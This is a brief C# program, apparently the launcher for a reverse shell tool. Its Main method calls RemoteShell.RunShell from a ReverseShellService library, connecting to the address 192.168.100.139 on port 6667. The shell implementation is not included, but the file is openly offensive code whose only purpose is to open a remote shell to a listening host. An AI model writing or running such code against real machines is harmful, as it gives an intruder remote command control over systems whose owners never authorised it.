using ReverseShellService;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ReverseShellApplication
{
    class Program
    {
        static void Main(string[] args)
        {
            RemoteShell.RunShell("192.168.100.139", 6667);
        }
    }
}
